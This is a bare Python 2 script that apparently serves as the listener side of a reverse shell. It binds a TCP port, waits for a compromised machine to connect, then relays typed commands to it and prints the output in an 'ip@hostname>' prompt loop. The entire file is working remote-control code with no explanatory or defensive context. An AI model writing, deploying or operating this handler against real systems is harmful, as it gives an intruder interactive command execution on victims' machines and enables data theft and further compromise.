import socket, os, sys
def socketCreate():
	try:
		global host
		global port
		global s
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		host = ''
		port = raw_input('Enter listening port: ')
		if port == '':
			socketCreate()
		port = int(port)
	except socket.error as msg:
		print 'Error when creating socket: ' + str(msg[0])
def socketBind():
	try:
		print 'Binding socket at port %s' %(port)
		s.bind((host,port))
		s.listen(1)
	except socket.error as msg:
		print 'Error when binding: ' + str(msg[0])
		print 'Retrying...'
		socketBind()
def socketAccept():
	global conn
	global addr
	global hostname
	try:
		conn, addr = s.accept()
		print '[!] Opened session at %s:%s'%(addr[0],addr[1])
		print '\n'
		hostname = conn.recv(1024)
		menu()
	except socket.error as msg:
		print 'Socket Accepting error: '+str(msg[0])
def menu():
	while 1:
		cmd = raw_input(str(addr[0])+'@'+str(hostname)+'> ')
		if cmd == 'quit':
			conn.close()
			s.close()
			sys.exit()
		command = conn.send(cmd)
		result = conn.recv(16834)
		if result <> hostname:
			print result
def main():
	socketCreate()
	socketBind()
	socketAccept()

main()	
	
